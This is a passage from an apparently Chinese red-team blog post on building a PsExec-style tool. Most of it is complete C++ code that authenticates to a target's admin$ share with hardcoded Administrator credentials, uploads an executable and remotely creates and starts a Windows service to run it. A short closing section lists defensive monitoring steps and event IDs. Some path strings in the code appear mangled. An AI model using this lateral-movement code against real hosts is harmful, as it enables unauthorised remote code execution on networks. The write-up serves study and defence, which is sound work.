    <span class="k">if</span> <span class="p">(</span><span class="n">hSCM</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenSCManager Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">hService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
        <span class="n">hSCM</span><span class="p">,</span> <span class="c1">// 服务控制管理器数据库的句柄</span>
        <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="c1">// 要安装的服务的名称</span>
        <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="c1">// 用户界面程序用来标识服务的显示名称</span>
        <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="c1">// 访问权限</span>
        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// 与一个或多个其他服务共享一个流程的服务</span>
        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span> <span class="c1">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span>
        <span class="n">SERVICE_ERROR_IGNORE</span><span class="p">,</span> <span class="c1">// 启动程序将忽略该错误并继续启动操作</span>
        <span class="n">lpwsServicePath</span><span class="p">,</span> <span class="c1">// 服务二进制文件的标准路径</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"CreateService Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Create Service Success : "</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">lpwsServicePath</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">hService</span> <span class="o">=</span> <span class="n">OpenService</span><span class="p">(</span><span class="n">hSCM</span><span class="p">,</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenService Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenService Success!"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="n">StartService</span><span class="p">(</span><span class="n">hService</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>获得SCM句柄后调用<code class="language-plaintext highlighter-rouge">CreateService</code> 创建一个服务，最终调用<code class="language-plaintext highlighter-rouge">StartService</code> 完成整个服务的创建、启动过程。</p>

<p>效果如下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9871cbc207bd2e26d2613428ec94c46e.png" alt="2020-04-01-14-39-18"></p>

<p>至此，整个Psexec工具原理分析与实践完成。</p>

<h2 id="0x07-psexec完整代码">0x07 PsExec完整代码</h2>

<p>代码我上传到了Github：<a href="https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp">https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp</a></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Psexec.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span>
<span class="c1">//</span>
<span class="cp">#include &lt;iostream&gt;
#include &lt;WinSock2.h&gt;
#include &lt;Windows.h&gt;
#include &lt;winnetwk.h&gt;
</span>
<span class="cp">#pragma comment(lib, "ws2_32")   
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib,"Advapi32.lib")
</span>
<span class="n">DWORD</span> <span class="nf">ConnectSMBServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsUser</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">);</span>
<span class="n">BOOL</span> <span class="nf">UploadFileBySMB</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span><span class="p">);</span>
<span class="n">BOOL</span> <span class="nf">CreateServiceWithSCM</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSCMServer</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServicePath</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[ PS|&gt; :) Hello PsExec By Rvn0xsy !"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="n">LPCWSTR</span> <span class="n">lpwsHost</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"192.168.3.130"</span><span class="p">);</span> <span class="c1">// 目标机器地址</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Administrator"</span><span class="p">);</span> <span class="c1">// 账号</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"123456"</span><span class="p">);</span> <span class="c1">// 密码</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsSrcPath</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:\Users\Administrator\NewPsexec.exe"</span><span class="p">);</span> <span class="c1">// 本地文件路径</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"92.168.3.130</span><span class="se">\a</span><span class="s">dmin$\NewPsexec.exe"</span><span class="p">);</span> <span class="c1">// 远程文件路径</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsServiceName</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"NewPsexec"</span><span class="p">);</span> <span class="c1">// 服务名称</span>
    <span class="n">LPCWSTR</span> <span class="n">lpwsServicePath</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"%SystemRoot%\NewPsexec.exe"</span><span class="p">);</span> <span class="c1">// 目标机器落地位置</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ConnectSMBServer</span><span class="p">(</span><span class="n">lpwsHost</span><span class="p">,</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">lpwsPassword</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">BOOL</span> <span class="n">bRetVal</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="n">bRetVal</span><span class="o">=</span><span class="n">UploadFileBySMB</span><span class="p">(</span><span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">lpwsDstPath</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bRetVal</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Upload Success !"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
            <span class="c1">// 如果上传成功即可创建服务</span>
            <span class="n">CreateServiceWithSCM</span><span class="p">(</span><span class="n">lpwsHost</span><span class="p">,</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">lpwsServicePath</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Upload Failed ! Error : "</span><span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">GetLastError</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="nf">ConnectSMBServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 用于存放SMB共享资源格式</span>
    <span class="n">PWCHAR</span> <span class="n">lpwsIPC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WCHAR</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span> 
    <span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span> <span class="c1">// 函数返回值</span>
    <span class="n">NETRESOURCE</span> <span class="n">nr</span><span class="p">;</span> <span class="c1">// 连接的详细信息</span>
    <span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span> <span class="c1">// 连接选项</span>

    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NETRESOURCE</span><span class="p">));</span>
    <span class="n">swprintf</span><span class="p">(</span><span class="n">lpwsIPC</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"\%s</span><span class="se">\a</span><span class="s">dmin$"</span><span class="p">),</span> <span class="n">lpwsHost</span><span class="p">);</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">dwType</span> <span class="o">=</span> <span class="n">RESOURCETYPE_ANY</span><span class="p">;</span> <span class="c1">// 枚举所有资源</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpLocalName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span> <span class="o">=</span> <span class="n">lpwsIPC</span><span class="p">;</span> <span class="c1">// 资源的网络名</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpProvider</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> 

    <span class="c1">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span>
    <span class="n">dwFlags</span> <span class="o">=</span> <span class="n">CONNECT_UPDATE_PROFILE</span><span class="p">;</span> 

    <span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">WNetAddConnection2</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span><span class="n">lpwsPassword</span><span class="p">,</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">dwFlags</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dwRetVal</span> <span class="o">==</span> <span class="n">NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 返回NO_ERROR则成功</span>
        <span class="n">wprintf</span><span class="p">(</span><span class="s">L"Connection added to %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">dwRetVal</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"WNetAddConnection2 failed with error: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwRetVal</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">UploadFileBySMB</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span>
    <span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">CopyFile</span><span class="p">(</span><span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">lpwsDstPath</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">dwRetVal</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">TRUE</span> <span class="o">:</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">CreateServiceWithSCM</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSCMServer</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServicePath</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Will Create Service "</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">lpwsServiceName</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">hSCM</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">hService</span><span class="p">;</span>
    <span class="n">SERVICE_STATUS</span> <span class="n">ss</span><span class="p">;</span>
    <span class="c1">// GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG</span>
    <span class="n">hSCM</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span><span class="n">lpwsSCMServer</span><span class="p">,</span> <span class="n">SERVICES_ACTIVE_DATABASE</span><span class="p">,</span> <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSCM</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenSCManager Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">hService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
        <span class="n">hSCM</span><span class="p">,</span> <span class="c1">// 服务控制管理器数据库的句柄</span>
        <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="c1">// 要安装的服务的名称</span>
        <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="c1">// 用户界面程序用来标识服务的显示名称</span>
        <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="c1">// 访问权限</span>
        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// 与一个或多个其他服务共享一个流程的服务</span>
        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span> <span class="c1">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span>
        <span class="n">SERVICE_ERROR_IGNORE</span><span class="p">,</span> <span class="c1">// 启动程序将忽略该错误并继续启动操作</span>
        <span class="n">lpwsServicePath</span><span class="p">,</span> <span class="c1">// 服务二进制文件的标准路径</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"CreateService Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Create Service Success : "</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">lpwsServicePath</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">hService</span> <span class="o">=</span> <span class="n">OpenService</span><span class="p">(</span><span class="n">hSCM</span><span class="p">,</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenService Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"OpenService Success!"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="n">StartService</span><span class="p">(</span><span class="n">hService</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="0x08-总结psexec防御">0x08 总结PsExec防御</h2>

<ol>
  <li>如果内网大量机器使用SMB V2，可从网络协议上进行分析，着重监控<code class="language-plaintext highlighter-rouge">OpenSCManager</code>
</li>
  <li>终端上进行事件监控如：创建服务、创建文件，根据HASH匹配能有效阻绝一部分攻击</li>
  <li>服务器采用强口令，内网通用密码的情况太严重</li>
  <li>在终端上日志着重采集以下事件ID
    <ul>
      <li>事件ID：4624</li>
      <li>事件ID：4648</li>
      <li>事件ID：7045</li>
      <li>事件ID：7036</li>
    </ul>
  </li>
</ol>

<p><strong>我的研究与总结可能不够严谨，欢迎斧正。</strong></p>

  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
